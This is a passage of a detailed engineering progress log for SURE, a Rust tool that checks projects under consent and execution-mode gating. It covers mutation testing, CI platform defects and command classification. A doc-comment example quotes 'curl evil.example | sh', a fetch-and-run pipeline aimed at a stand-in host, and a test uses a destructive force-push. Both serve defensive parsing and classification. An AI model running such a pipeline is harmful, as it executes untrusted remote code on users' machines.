or in a code span **with a separator in it** — the separator rule is the whole cost
of the feature and it is paid openly, because `` `Cargo.toml` `` and
`` `process.env.NAME` `` have the same shape and reading the second as a file would
be a page of findings about files that do not exist. A reading is looked for in two
places, beside the document that names it and at the project root, and the one
beside the document wins when both are there.

**Four verdicts, and one of them is expensive enough to have its own rule.**
`ClaimAssessment` is `Confirmed`, `Contradicted`, `CannotConfirm` or
`NotCheckable`, and `counts()` gives a row for all four including the zeros. The
rule is about `Contradicted`: **it may only be returned when the pass can answer
for the places it did not look.** A path claim with no reading is contradicted only
if no skip covers a reading and the walk was complete; a script claim is
contradicted only if the walk was complete, and the comment on that branch says the
rule is deliberately coarse — a walk that stopped early yields `CannotConfirm` for
*every* script claim in the project rather than for the ones under the skipped
directory, because sorting those out is a second reading of the same evidence and
this pass does not need it in order to be honest. `SetupReport::is_complete()`
delegates to `DocumentReport::is_complete()`, so the two cannot drift apart.

**Which manifest a documented command is about is the nearest one at or above the
document, and a manifest SURE could not read is a third state rather than an empty
one.** `Manifests` pairs every `package.json` the scan found with the `Package` the
discovery read for it, or with `None`; `None` produces `CannotConfirm`, never
*"declares no scripts"*, because those are two different claims about the same file
and only one of them is true. A name that is in `scripts_not_commands` — an entry a
package manager will not run — is contradicted **as that**, with its own sentence,
rather than as an absent script.

**Nothing a document says may block a hand-off, and severity is where that is
decided.** Every `Contradicted` carries `Severity::ShouldFixFirst` — never
`MustFix`, which `docs/architecture/FROZEN_SEMANTICS.md` defines as blocking a
hand-off alone. The reason is not tone: *"the README says `npm run build` and the
manifest declares no `build`"* is a disagreement between two artefacts where the
wrong half is not knowable from here, and a `MustFix` has to stand on an
`ObservedFact` by itself.

**A false finding was found by writing a mutation, and it was in `documents.rs`
rather than in `setup.rs`.** ``Deploy to `https://example.com/app`.`` contains a
`/`, which was the whole of what a code span needed to be read as a path, and
`https:` is not a Windows path prefix — so the reading looked like it was inside
the project and a correct README came back **contradicted**. The fix belongs where
the ambiguity is: `documents.rs`'s `span_candidate` now refuses an absolute
reference beside a non-plain target, sharing `is_absolute_reference` with the
link-target reader that already refused one. Held by a new unit test in
`documents.rs` and by `a_url_a_document_names_is_not_a_path_in_the_project` in
`document_commands.rs`.

**The other false finding was found by the CI matrix, and it is the one this
machine could not have found.** `C:/Windows/win.ini` is a path prefix to
`std::path::Path` on Windows and one ordinary relative component to `Path` on
Linux and macOS, so a README telling a Windows user where a font or a toolchain
lives became a claim about a file *inside the project* on two platforms out of
three — looked for, not found, and answered **`Contradicted`**. Run `34991517761`,
the run of `ed96627`, failed `a_path_that_climbs_out_of_the_project_is_not_looked_for`
on macOS and Ubuntu and passed on Windows: the shape of a defect that is invisible
where it was written. The reading is now taken from the characters — `names_a_drive`
refuses one ASCII letter and a colon before any `Path` exists to disagree about it —
so one document is read the same way on all three platforms, and the cost (a project
that really does hold a file named `C:notes.md`) is stated where the rule lives.
`leaves_the_project` still asks the platform, because a `Path` is the platform's and
both of its answers are correct about the value it was handed; **its test now writes
both answers down under `#[cfg]` instead of asserting the local one.**

**Two of the twenty mutation rows measured nothing on the first pass, and the
harness said so instead of counting them.** `m4` and `m11` were refused with
*"the old text occurs 0 times"* because `rustfmt` had reflowed both anchors after
they were written; both were re-anchored against the formatted source and re-run,
and both are caught — each by exactly one test. **A row whose anchor does not match
is not a survivor and it is not a pass**; it is a row that has said nothing, and
the first run's tally is reported as 18 rows measured with two named as unmeasured
rather than as 20 rows with 18 caught. **The set was then re-run in full against the
tree this task commits — 21 rows, 21 caught, 0 survivors, 0 refused, every restore
verified by blob hash** — and two rows moved because of the fix rather than because
of the mutation: `m20`, the URL in a code span, is now caught by **four** tests
rather than two, since a drive letter in a code span goes through the same refusal,
and `m21`, *a drive letter is judged by the platform*, is caught by the unit test in
`documents.rs` and by `a_windows_location_is_not_a_path_in_the_project` — which is
what a row written for a fix should look like, in that **it did not exist before the
defect did.** One name in those lists is not a catch and is not counted as one:
`m14`'s list gained `a_service_that_is_dropped_is_stopped_anyway`, which is
`P3-T009`'s test in a binary whose source contains no occurrence of `setup` at all,
so the mutation cannot reach it — **30 serial runs and 60 runs of six concurrent
instances of that binary all pass**, and the row's attributable catches are three,
the same three as before. **It is left as an open observation about `P3-T009`**: one
unexplained failure under load, not reproduced, and *not reproduced* is not *not
there*.

**A doc comment asserted behaviour the code does not have, and reading it against
the committed function is the only thing that caught it.** The module documentation
said `npm run build && curl evil.example | sh` "yields the name `build`"; the
committed `script_from` compares every word against `is_plain_word`, and `&` and `|`
are both refused, so the line names **nothing at all**. **The code was right and the
sentence was wrong**, which is why no test failed and no mutation row could have
found it — and a comment promising a guarantee nobody checked is how a guarantee
comes to be believed without being one. Rewritten to say what happens, and to name
the case that does yield a name: `npm run build --silent` names `build`, and the
flag is never read.

## What `P4-T004` added

**The one thing about `P4-T004` a reader should know before the detail: its
acceptance names four words, and the second half of the sentence is what decides
what one of them means.** The sentence is *"fmt/check/clippy/test evidence binds
to current fingerprint."* The four words are four `CommandRole`s — `Format`,
`Check`, `Lint`, `Test` — and for three of them the check is the command the
discovery already planned. **`cargo fmt` is not a check and `cargo fmt --check`
is**, because evidence binds to a fingerprint and `cargo fmt` *rewrites the tree
the fingerprint was taken of*: the result would describe the project before the
run and there is no state it is still true of afterwards. `format_command`
appends that one flag to the discovery's own string rather than composing a
command, and `titled` gives the check its own sentence (*"check that the source is
formatted"*) instead of the role's `plain_name` (*"rewrite the source to a
style"*) — because a title is what a person reads in the consent prompt, and one
describing the writing form while the reason named the reading form would be SURE
telling a user it will change their files when it will not. Both halves are
mutated, and both mutations are caught.

**The second thing: the binding is the signature rather than a rule a caller
keeps.** `checks::evidence_of` takes the fingerprint off
`CheckResult::project_fingerprint`, which is a required field with no `Default`,
so *a result's evidence is bound to the state that result is about* cannot be got
wrong by a caller that forgets. `None` from that function is exactly
`EvidenceClass::Unknown`, which is exactly what a `MissingCommand`'s result
carries, so a tool the project never asked for cannot reach a report as anything
but a sentence saying it was not checked — held over `MissingKind::ALL` rather
than over the two kinds this module happens to produce.

**The third thing, and the finding this task is most about: one mutation survived
the whole suite, and what it found was a doc comment rather than a missing test.**
Dropping the second half of `RustChecks::is_empty`'s conjunction is caught by
**zero** tests, and it always will be — for Rust the two halves cannot disagree,
because `CommandRole::Check` and `CommandRole::Test` name `cargo`, a root
`Cargo.toml` is what declares `cargo`, and so `proposed` is never empty while
`missing` is not. **The two versions are extensionally equal for every value the
type can hold**, which is why no test can tell them apart and why the honest
answer is not another test. The comment above that method claimed the second half
was *"the one a mutation can drop"* and named a project that asked for neither
tool as the case proving it — and that project proposes two checks, so both
versions answer `false` and the named case proved nothing. **The comment was the
defect.** It now says why the halves agree, says plainly that the second half is
not reachable through `RustChecks::of` today, and points at `super::python`, where
the conjunction *is* load-bearing because all four of its roles can be unplanned.
`the_layer_is_empty_exactly_when_sure_read_no_manifest` holds the equivalence over
every fixture shape, so the day a role table change parts the halves is a failing
test rather than a stale paragraph — and a thirteenth mutation, which takes
`Check` out of discovery and is exactly that change, is caught by nineteen tests
**including the new one.**

**The fourth thing is not this task's code at all: the implementation run came
back red on macOS, and what it found was a test from `P3-T009` that assumed its
premise instead of waiting for it.** `a_service_that_is_dropped_is_stopped_anyway`
drops a service and then measures the stop with the child's heartbeat. It waited
for `started` and dropped — and the child writes `started` one statement before
its first heartbeat, so a loaded scheduler can kill it in between, leaving a
heartbeat that was never written. `wait_until_quiet` read a missing file as `""`
twice and answered "quiet", and **the assertion that exists to refuse exactly that
reading said so**: a stop that worked, reported as a failure to stop. The test now
waits for the heartbeat before dropping, and the child writes each heartbeat aside
and renames it into place so that a kill cannot leave a half-written one — the
same reading, arrived at one statement later. **The failing commit touches none of
it**, and the fix is `702cfee`, read below.

## What `P4-T003` added

**The one thing about `P4-T003` a reader should know before the detail: the
acceptance is one sentence with two halves, and the second half is satisfied by a
*type* rather than by a rule.** The sentence is *"Declared import/test/lint/type
checks use available tools without silent package installation."* `CommandRole::ALL`
is install, test, lint, type, format, build, and the acceptance's four words are
read as the first four in that order — so `import` is read as `Install`, on the
evidence that the half of the sentence with teeth is about package installation.
`InstallStep` is then a type of its own: not a `CheckProposal`, so it cannot enter
a `PlanBuilder`, cannot be scheduled, and cannot acquire a `CheckResult`. *Without
silent package installation* is therefore structural instead of a convention
somebody has to keep, and `nothing_this_module_proposes_installs_anything` holds
it over every project shape rather than over the ones somebody thought of.

**The second thing: this ecosystem needed a `Runner` value that node's did not,
and the reason is that `command_for` has an answer where it should have none.** A
project mid-way from poetry to uv — `[tool.poetry]` with a `uv.lock` beside it —
makes `Managers::agreed` answer `None`, and `command_for` then builds
`python -m pytest`. That is a **third interpreter** which neither declaration
named, and when it fails it says `No module named pytest`: a sentence that is
false about a project which does declare pytest, and true only about the
interpreter SURE picked. `Runner::Unknown` makes every declared role a `NoRunner`
gap instead, with the discovery's own sentence for why.

**The third thing, and the one this session's own refactor is about: the first
version of `install_step` looked its anchor back up, and the fallback it had for
a lookup that failed could not be reached and would have been a false anchor if
it had been.** `agreed` reads its answer from the same three tiers the lookup
walked, so the lookup always succeeded; the substitute named `Pipfile` for an
installer a `Pipfile` had not declared. It is **deleted rather than documented**,
together with the doc comment claiming the tier-scan order was load-bearing (each
installer occupies at most one tier, so the order changes no answer today).
`Managers::agreed_finding` is now the single encoding of the tier order, `agreed`
is a view of it, and `Runner::Agreed` carries the finding — so the step's file
and its sentence are the evidence itself and there is no branch in which they
could be wrong. **Two of the seventeen mutations restore that deleted defect
exactly; one of them is caught by exactly one test, the one written for it.**

## What `P4-T002` added

**The one thing about `P4-T002` a reader should know before the detail: the
frozen `NotCheckedReason` has no word for *"the project declares this and what it
declares is not something SURE can run"*, so SURE says the true sentence and
groups by the nearest wrong word, and that choice decides whether a broken
manifest holds a run out of green.** The acceptance is two sentences —
*"Declared build/lint/type/test checks run only under allowed execution mode.
Missing commands are not passes."* — and the second is the one with no plan entry
to hide in. `checks::node` proposes Build, Test, Lint and TypeCheck for every
readable manifest, and where a project gives SURE no command for one of them it
records a `MissingCommand` rather than saying nothing. `NotApplicable` would be
the natural word for the first of the three ways that happens and is **false** for
the other two — a `"test": ["jest"]` or a declared script with no lockfile is a
defect in the project, and `NotApplicable`'s `is_scope_limit()` is `true`, so
mapping either onto it would put a broken manifest **outside** what can hold a run
out of green. `UnknownReason` is what the two map onto, and the module says in
its own documentation that the word is wrong and why it is still the best of the
four available. `progress/DECISIONS.md` has the full argument.

**The second thing a reader should know: the mutation set found five survivors,
and four of them were the same finding — a claim with prose and no test.** Flipping
the lint's severity from `CanFixLater` to `MustFix`, flipping the type check's
`critical` from `false` to `true`, deleting the explanation from
`MissingCommand::plain_description`, and answering `NodeChecks::is_empty` from
`proposed` alone each **passed all 1045 tests**, because the paragraph above the
table was the only place the policy existed. The fifth was worse and more useful:
the test written to kill the fourth **survived its own mutation**, because its
fixture used a project with one script and so `proposed.is_empty()` was `false`
under both readings. A test for a conjunction is worth exactly as much as the case
where the two conjuncts differ. All five are now held; the final tally is
**twenty-three mutations, twenty-three caught, eight by exactly one test**.

## What `P4-T001` added

**The one thing about `P4-T001` a reader should know before the detail: the
acceptance sentence names something the frozen `CheckPlan` cannot hold, so the
task is about a *schedule* and the plan is downstream of it.** The sentence is
*"Ordered plan includes reason, evidence class and execution requirements per
check."* A `CheckPlan` is `id`, `fingerprint`, `mode`, a list of static check ids,
a list of dynamic check ids and the exclusions — **identifiers and nothing else**,
because adding a field to it is an ADR-level decision. It therefore cannot carry
a reason or an evidence class, and it cannot be the thing the acceptance names.
What this commit adds is the schedule, and
`CheckSchedule::planned_checks` is the **one** bridge to
`Enforcement::of`, so the order a report shows is decided in one place rather
than re-derived by whoever calls `Enforcement`.

**"Ordered" means a function of the checks and not a transcript of somebody's
loop, and the mode is deliberately *not* one of the rules.** Three rules, applied
in order, the last of which makes the order total: checks that run nothing come
first; then by severity, worst first; then by identifier, smallest first. It is
held over **all 120 permutations** of a five-check set, and the sweep **collects
the orders it visited rather than counting them** — a permutation sweep is
exactly the kind of loop whose failure is a smaller, plausible answer, and 24
iterations that produced one permutation 24 times would pass a count. The mode is
excluded on purpose: a decision is not a property of a check, it is the answer to
a question asked *about* one, so folding it into the ordering would make the same
checks come back in two different orders and a caller comparing an inspect-only
plan with a host-confirmed one could no longer tell **a changed decision from a
reshuffled plan**. `the_order_does_not_move_when_the_mode_does_but_the_decisions_
do` keeps the decisions on the entries and out of the order. **That test also
corrected this module's own prose**: the first draft of rule 2 said `Severity`'s
variant order was the *inverse* of `rank`, and `Severity`'s `Ord` is written by
hand and already agrees with it — so the two are now **asserted** to agree
(`Severity::ALL.windows(2)`) rather than assumed to, which is the same repair
`P3-T008` made to four documents in one pass.

**A false sentence was on course to be shown to a user, and the test that found
it was written for something else.** `permissions_missing` filtered on
`!decide(..).is_allowed()` — the *decision* — so it listed permissions that were
**granted** but blocked by the mode, and `plain_description` then told the user
*"will not run: run_project_code"* about a permission **they had already given**.
`blocked_by` and `permissions_missing` now filter on the permission set and take
**no mode at all** (it is a fact about the permission set, the same list under
every one), and `plain_description` has **three** outcomes rather than two, so a
mode-blocked check says *"will run only if you agree"* and never names a granted
permission. The sentence a user reads before deciding is the one place this
repository can least afford a plausible-looking wrong answer.

**The mutation set left one survivor on its first run, and the test that kills it
exists only because of that.** Nineteen mutations, nineteen caught, twelve by
exactly one test — **but the first seventeen-mutation run reported `m16` as
survived.** It answered `may_run` from `blocked_by.is_none()` instead of from the
decision, and **the entire 630-test suite was silent**, because the two agree
whenever a check is denied a permission and come apart exactly where **every
permission is granted and the mode still refuses to run project code**. A caller
asking `blocked_by` would be told the check runs and would produce no result for
it, so the check would **vanish from the report** instead of appearing as one
that did not happen. `a_check_the_mode_stops_still_gets_a_result_saying_it_did_
not_run` was written to hold it, and the set was re-run in full against the
changed file so the log is one vintage rather than two. **`m2`'s first draft did
not compile** — it moved the whole tuple's type — and the harness printed nothing
at all for it, which is the one outcome `mutate3.py` refuses to guess at; the
mutation now carries the signature with it, and *a mutation that does not compile
is not a mutation that was caught* is the same rule `P3-T011`'s `INCONCLUSIVE`
line was added for.

**This paragraph said `P3-T008`, `40 / 166` and `8 / 11` until this commit, and
that is a defect this commit repairs rather than a difference of opinion.**
`a6bc8df`, which was `P3-T009`'s acceptance, updated the file everywhere except
its first eleven lines, so for one whole task **the top of this file named a task
that was not the one the file was carrying** — and the paragraph it left standing
said "the commit carrying this file is its acceptance", which was false of the
commit a reader was holding. **The other fifteen acceptance commits on this
branch, back to `P2-T006`'s `48d1057`, each changed at least one line of this
paragraph — `a6bc8df` is the only one of the sixteen that changed none of it** —
so the omission is visible in `a6bc8df`'s diff as a hunk that is *absent* rather
than as one that is wrong, which is the shape a reader skimming a diff does not
see. **The list below had also
fallen five entries behind**, and that is recorded where the entries are added.

**The one thing about `P3-T008` a reader should know before the detail: the
harder half of its acceptance was about prose, and four places were failing it.**
The sentence is *"Container plan controls mounts/network/working dir and is
described as limited isolation, not perfect sandboxing"*, and the second clause
is not a type. `ExecutionMode::Container`'s doc comment **and its consent prompt**
— the sentence a user reads before agreeing to run a stranger's code — plus
`docs/adr/0009`'s `container` row and `docs/architecture/EXECUTION_SAFETY.md` all
called the mode *isolated* and stopped there. All four now say **limited
isolation**, and the wording is now a check rather than a one-time correction:
`OVERCLAIMS` and `overclaims()` are applied by
`tests/container_isolation_claim.rs` to every shipped `.rs` under `crates/` and
every `.md` under `docs/`.

**The second thing, and it is the first time this branch has recorded a coverage
gap it did not close.** `doctor::find_in` documents that an empty `PATH` entry is
skipped rather than read as the current directory — on Unix an empty entry *is*
the current directory, which is where a checked project would keep a `docker` it
would like SURE to run. **No test holds it.** The nearest test passes an empty
*directory*, which is a different thing, and the only way to observe the
difference needs a file in the working directory that the platform's `can_be_run`
accepts. Measured rather than argued: removing the filter leaves the suite green.
Recorded in `DECISIONS.md` and here, and not fixed, because the fix is a test
about `doctor` rather than about this task.

**The third thing, and it is the forward link this file has not had before.**
`grep -c '"P3-T008"' tasks/tasks.json` answers **2** — its own `id` and one
`depends_on` — so unlike `P3-T007` this task has a dependent: `P14-T006`,
*"Implement execution-trust fixtures"*, whose second acceptance sentence is
**"Container unavailable path is honest."** That is this task's first acceptance
sentence arriving later in the DAG as a fixture, which is the strongest form of
the check this branch keeps asking for: not a reader of the paragraph, a test.
**That dependent did not enter the READY list, and the reason is worth knowing
before reading the list's reading**: `P14-T006`'s `depends_on` is
`["P3-T008","P7-T004"]`, and `P7-T004` is `queued`, so accepting this task
unblocked nothing and the list shrank `14 → 13`.

**The fourth thing, and it is about the mutation harness rather than the code.**
`target/tmp/mutate3.py` is `mutate.py` generalised to any file and any filter, and
**its own first run produced two false verdicts and said so.** `text=True` decodes
subprocess output with the locale encoding — GBK here — and one mutation killed
the harness inside a reader thread; the filter was passed as one `argv` element,
so `cargo` rejected it and three prose mutations were reported as *survivors of a
suite that never started*. Both are fixed, and the second is fixed in the
reporting too: a run with no `test result:` line now prints **INCONCLUSIVE**
rather than "this mutation survived". `mutate.py` has the same latent decode bug
and did not hit it — its filter and its test names are ASCII, so the `P3-T007`
record stands.

**The one thing about `P3-T007` a reader should know before the detail:
`inspect_only` has been true of this build by accident, and this is the task that
stops it being true that way.** Nothing in this repository launches a project
process — `tests/spawn_sites.rs` counts three places that build a `Command`, all
inside the runner's own machinery, and it says in its own documentation that it is
written to fail the day a check is wired to one. So "no project code runs" has been
a fact about the build rather than a property of the mode, and **the two fail
differently: an absent runner fails loudly, and a mode that is never consulted
fails silently.** `crates/sure-core/src/enforce.rs` turns the absence into a value
— `Enforcement::admitted()` is the subset of a plan's commands that may run, and
**a runner must take what it launches from that iterator and from nowhere else.**
That is a rule about the caller, no type in this repository holds it, and the
enforcement has no dependents in the task graph either: `grep -c '"P3-T007"'
tasks/tasks.json` answers 1, which is its own `id`. So the gate exists and the road
through it is still to be built, which is the same position `approval.rs` is in and
is recorded rather than glossed.

**The second thing about `P3-T007`, and it is a finding about the tests rather than
the code.** A mutation that replaced the branch filling `CheckPlan`'s two lists —
the whole of what a report can say about *how* a check will be performed — with an
unconditional push to `static_checks` broke **exactly one test**, and that test was
asserting `dynamic_checks.len() == 1` for an unrelated purpose. **A field whose
contract hangs on one unrelated assertion is a field nothing is holding**, and the
non-vacuity guard already in the file does not cover it: that guard counts the
effects of *admitted commands* and says nothing about which list a check went into.
Two different claims, only one of them had a test, and `719253e` is the test that
holds the other one directly.

**The third thing about `P3-T007`, and it is the shape this file has now recorded
twice.** The enforcement is a rule about the caller; `P3-T009` — the service
startup supervisor, *"Can start/stop supported local services with timeouts and
captured logs"* — is the next task in the DAG whose acceptance is about starting
something, and **its `depends_on` is `["P3-T001","P3-T006"]`.** A dependency edge
says *do this after that*, and nothing in `tasks/tasks.json` makes a supervisor
consult `enforce.rs`: it could satisfy its own acceptance sentence while this gate
is bypassed entirely.

**The one thing about `P3-T006` a reader should know before the detail: the first
acceptance sentence would be vacuous without a field that is not about the
command.** "Only approved command categories execute" cannot be checked against a
record that does not say *which* categories were approved — and the record
`P3-T005` left behind, `ApprovedCommand`, said only what would run. That is why
it has a fifth field now, `effects`, holding the categories the user was *shown*.
Without it the gate would re-derive the categories at the moment it decided, and
since `safety::classify` is a pure function of `(program, arguments)` the two
values would be the same value: **every command would be approved by
construction, and the sentence would be true of nothing.** What gives the
comparison content is that **an approval outlives the build that wrote it** — it
is written to disk, read back by a later SURE, and put to a classifier that may
since have learned something. `Refusal::CategoryNotApproved` is that case, and it
is where the sentence is enforced rather than asserted.

**The second thing, and it is a correction the suite made to my own test rather
than to the product.** `execution.rs`'s `covers_is_one_way_and_says_which_way`
asserted that an `[Install, Network]` approval still covered a `[Static]`
command. It does not: `Static` is not a subset of `Install, Network`, it is a
*different reading*, and `covers` says `false`. The assertion now says `false` and
carries the reason the case cannot reach the gate either way — a static-only
command is `Permitted` by `Permission::Inspect` in the gate's first branch, before
any consent is consulted — so **no special case was added for `Static`**: a rule
with no producer of the case it handles is vocabulary rather than behaviour.

**The third thing, and it is a finding about how little of a plan a user is ever
asked about.** Under `host_confirmed` with every permission granted, `cargo add
serde` is **not a question** — it is `Allowed`, because `Install` counts as
running project code and host-confirmed runs project code — so the first version
of the test that needed a consented command found an empty list and panicked. It
uses `git push --force origin main` now, which is `[Network, Destructive]` and
stays a question under every permission set because `Destructive` has no
permission that covers it. **A test that cannot reach the code it tests has not
run, and this one said so instead of passing.** The companion structural fact is
that the two `WhyAsked` reasons cannot co-occur in one request: `decide_for`
checks the ungrantable category before the mode, so a command that is a question
only because the mode runs nothing is already `Denied` if any of its categories
is ungrantable.

**The one thing about `P3-T005` a reader should know before the detail: the
second acceptance sentence — a denied command becomes skipped, never a pass — is a
property of the shape of the code rather than of a test.**
`PlannedCommand::refusal` is the only place `crates/sure-core/src/consent.rs`
makes a `CheckResult`, and the passing branch does not exist in it: a command that
may run returns `None`, because what to report about it depends on what happens
when it does. A refused command returns `Skipped` with its reason **and its
weight** kept, and the weight is the half that is easy to lose — a skipped
`MustFix` critical check that forgot it was `MustFix` is a green report assembled
out of things that never happened. The file joins `P3-T004`'s classifier, the
decision and the check plan, and it builds no `Command`: the spawn census is still
three entries, so the level-C support ceiling's justification is intact.

**The second thing, and it is a correction to my own first version of the
deciding code.** `runs_project_code` over a *set* of categories is `DynamicHost`
**and `Install`** — installing runs a package's own install steps and builds
source distributions with the backend it shipped. My first draft tested only
`DynamicHost`, so `npm install` under `inspect_only` came back `Denied` where
`decide(ActionKind::InstallDependencies, …)` answers `NeedsConsent`: **a check
reported as impossible that was merely unasked.** The test that found it runs both
deciders over every category that has an `ActionKind`, in every mode and under
both a read-only and a fully granted permission set, and requires them to agree —
and it is the reason the second decider could be written out at all, since a set
can hold combinations no single `ActionKind` describes. **A restated rule is only
safe when something checks it against the original.**

**The third thing, and it is the mutation harness finding something no amount of
reading would have.** `target/tmp/mutate21.py` reported one MISSED on its first
run: deleting the loop in `PermissionPlan::explain` that appends each command's
lines left the whole suite green. The commands' own `explain` is covered from
several directions; **the plan's — which is the one a report actually calls, and
which is the first acceptance sentence at the level it is printed — was covered
from none.** It is now held by `a_plan_explains_every_command_it_holds`, whose
expected line count is taken from the commands rather than written down. The
accepted run is 24 mutations, 24 caught, 0 declared unobservable.

**The fourth thing, and it is a correction to a committed number rather than to
code.** `P3-T004`'s acceptance note headlines `1126` for Windows; that is the sum
over all 44 result lines and the **parent sum is `1116`**, because
`store_concurrency.rs` re-runs itself ten times with a filter and each re-run
contributes a `passed` for a test already counted. Re-reading run `34935781639`:
Windows `sum_all=1126 sum_parents=1116`, macOS `1117`, Ubuntu `1118` — so
`1078 + 38 = 1116` and the note's arithmetic was right about the delta and wrong
about which number it quoted. That note cannot be rewritten, so the correction
lives in `DECISIONS.md` and in this task's note. **The same mistake is in
`c940300`'s own message in two smaller places**, recorded in `DECISIONS.md` with
its anchor.

**The one thing about `P3-T004` a reader should know before the detail: the
acceptance names five categories, and the module that decides which one a command
falls into can be wrong in exactly one way that nothing downstream could
catch.** `crates/sure-core/src/safety.rs` is new and is the first thing in the
product that reads a command line. Its answer is a set of the categories a
command *may* fall into, and the whole module is arranged around one rule:
**nothing is `Static` unless a rule in the file says so.** A program with no row,
a known program with an operation the table has no name for, and a command line
whose meaning is in text SURE cannot read all come back as *every category but
`Static`* — not as an empty set, and not as "unknown". A classifier that answered
"read-only" for a command it did not recognise is the false green this product
exists to prevent, and it is the one mistake here that no later check could
notice. The three causes are kept apart anyway, because they have three different
follow-ups: an unknown program means the table needs a row, an unknown operation
means the same program needs a row, and unread text is the one that table work
cannot fix.

**The second thing, and it is a correction to my own prediction rather than to
the code: the mutation harness's first run said the two mutations I had declared
unobservable were caught.** The claim was that forcing the *Unix* half of the
name rule — answering a name without lowercasing it — would be invisible on
Windows. It is not: `cfg!` makes both arms compile and then one of them runs, so
the test asserts **this machine's** rule and forcing the other platform's rule
into the code breaks it here. What no test on this machine can see is the
**Windows** rule applied everywhere, which is not a change here at all, and that
pair is what the declarations name now. A third finding in the same run was a
real hole and was fixed with a test rather than argued away:
`is_batch_file`'s lowercasing is a second copy of a rule `normalise` has already
run on Windows, so deleting it is invisible through `classify` on this platform —
the integration test that passes `NPM.CMD` stayed green — while on a platform
whose normalisation leaves the case alone it is the only copy, and what it
protects is the *reason* SURE reports rather than the answer it gives. It is now
held by a module test that calls it directly, which is the only surface on this
machine where the difference exists.

**The one thing about `P3-T003` a reader should know before the detail: CI said
the first version of it was wrong, and CI was right.** The acceptance is one
sentence — *"CI covers platform-specific runner behavior"* — and the first commit
that answered it wrote a row reading **"Linux and macOS: bytes are bytes"**. macOS
refuses to create a file whose name is not valid UTF-8 at all (`EILSEQ`, errno
92), so **that row was a sentence about two platforms and was true of one** — and
the machine this branch is developed on never compiles `#[cfg(unix)]` code, so no
local gate could have found it. The row has three columns now, and **each cell is
held by a test that runs on the platform it is about**, which is the only form in
which the acceptance sentence is a fact rather than an intention.

**The second thing about it, and the one that is not about the runner at all:
CI was passing a command set that could stop early.** `cargo test --workspace`
aborts every target after the first failing one, and the targets are exactly where
the platform-specific tests live. Measured on this machine rather than quoted:
with one deliberately failing test in `sure-core --lib`, the old command launched
**3 targets** and the new one, with `--no-fail-fast`, launched **29** — so **26
targets, every integration test in the workspace, were invisible under the
command CI was running, and nothing in its output said so.** The red run is where
the flag paid for itself: on `rust (macos-latest)`, **14 more binaries started
after the failing test and 19 of the 33 parent result lines were still to come.**

**The one thing about `P3-T002`, kept because it named the question `P3-T003` was
written to answer: the acceptance was already satisfied on paper, and reading it
again against the file
found one sentence covered in one position out of five and one test whose central
assertion was empty on the platform this task is named for.** "Paths with
spaces/Unicode are covered" named the working directory, and a path in a process
request is five different things: the directory, the **program** (a path that has
to survive being turned into a command line by somebody), an **argument**, a value
in the **environment block**, and, in reverse, the **bytes coming back out**. Four
tests now hold the four that were missing, over one `const AWKWARD` and one
`const NOT_ASCII` so that "a path with a space and a character outside ASCII"
means one thing everywhere it is used. **This task added no behaviour:**
`crates/sure-core/src/` is untouched, and the commit carries exactly two files —
`crates/sure-core/tests/process_runner.rs`, 29 tests to 36, and
`progress/state.json`.

**The second thing, and the reason this was not a test-writing exercise: the
existing tree test proved nothing on Windows, and that was measured twice rather
than argued.** Its claim is "a stop reaches the whole tree" and its evidence was
that the grandchild's report never appeared — but **a file that is absent is what
a stopped grandchild leaves behind and also what a grandchild that never ran
leaves behind**. With the grandchild's mode string changed to a name that is not a
test, the new marker assertion fails saying the grandchild never started; with the
same assertion removed, the old reading passes, in 3.26s, reporting `WholeTree`
about a tree that never existed. The fix is a positive control: the grandchild
writes `<report>.started` the moment it is running and waits for
`<report>.release`, the parent asserts the marker **before** it reads the absence,
and afterwards it drops the release so that "still running" and "was stopped" are
told apart by a write rather than by a sleep. On Unix the same mutation fails
loudly, because that branch asserts the opposite outcome — **the hole was in the
branch that skipped a measurement.**

**The third thing, recorded as a limit rather than as coverage: the four new
matrix tests are characterisation tests, and no mutation of the runner as it
stands can make them fail.** `OsString` round-trips on Windows and a
`to_string_lossy` step applied to valid Unicode is the identity, so every way of
breaking them first has to introduce a conversion the code has never had. What
they are for is the rewrite that reaches for one — a raw command line, a job
object, a hand-built environment block — and they are named as characterisation
rather than dressed up as mutation-covered. The one mutation this task added is
about the position that *can* be got wrong in the code as written, *"the program
path is quoted, in case it has a space in it"*, and the new test catches it:
applied, it fails alone in 0.01s with `os error 123`, `ERROR_INVALID_NAME`, before
any process starts.

**The one thing about `P3-T001` a reader should know, kept because it is still
the shape of the product: SURE can
now start a program, and nothing asks it to.** `sure_core::process` is a complete
bounded runner — one request carrying program, arguments, working directory,
environment, deadline, cancellation and output bounds, and one `Outcome` saying
what became of the run — and **no product path calls it**. That is not an
omission left to be discovered later: `tests/spawn_sites.rs` asserts that every
place in shipped code that builds a `Command` is named in that file, and that
nothing outside the runner names a process request at all, so the day a caller
appears the test says so. The corollary a reader should carry: this task is the
**prerequisite** for every check that runs something, and it is not itself a
check. `P3-T002`, `P3-T003` and `P3-T004` all became READY when it was accepted.

**The second thing, and the one that changes what the product will let SURE do:
the module does not claim a batch file cannot run.** A name with no extension is
completed to `.exe` and nothing else, so a bare `npm` is not found even where
`npm.cmd` is on `PATH` — but a `.cmd` or `.bat` named *with its extension* does
start, and the process that runs is `cmd.exe`, which Windows supplies rather than
SURE. All three cases are measured and held as tests rather than asserted in a
comment. **Whether a caller may name a batch file is left as an owner decision**,
written up in three places, because it cuts both ways: refusing makes `npm`,
`yarn`, `pnpm` and `gradlew` unrunnable on Windows, and permitting means SURE
starts project-controlled shell text through an interpreter it never names.
`P3-T004`, `P3-T005` and `P3-T007` were each expected to run into it; **the first
two did not settle it, which is the outcome the decision was left open for, and
`P3-T006` and `P3-T007` are the next two that will.**

**The third thing, which is a correction to something this session was about to
record as a fact.** The gate log holds two runs of the suite and the first pass
read them as disagreeing — 10 child result lines in one, 9 in the other. They
agree completely; one child line arrives with its `; finished in 0.87s.` clause
moved in front of its counts, because the children `store_concurrency` spawns
share one stdout handle, and a matcher anchored on `test result: ok\.` slides off
it. Matching on the five counts alone gives the same 43 lines / 33 parents /
10 children / 1082 on both runs. See the gate-set section below.

**This was the acceptance that opened a phase rather than closing one.** Phase
`P2` closed at `P2-T011`; `P3` was **1 of 11** with the other ten `queued` when
this paragraph was written, and reads **2 of 11** after `P3-T002`. The `phase:`
line in `taskctl status` reads `P3` because `start` wrote it, which is what that
field records — what is being worked on rather than a summary of the task list.

**`P3-T002`'s acceptance moved the READY list down, and that is a fourth
outcome rather than a repeat.** The list went **12 → 11**: `P3-T002` left by
being accepted and **nothing entered**, because no task in `tasks/tasks.json`
